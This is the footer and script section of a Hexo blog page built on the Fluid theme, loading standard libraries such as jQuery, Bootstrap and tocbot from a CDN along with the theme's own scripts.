  <footer>
    <div class="footer-inner">
  
    
    <div class="footer-content">
       <p> Copyright &copy; 2022&nbsp;-&nbsp;2024 <a href="/">Modifier</a> </p> <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></p> <!--  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> -->

    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  

<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
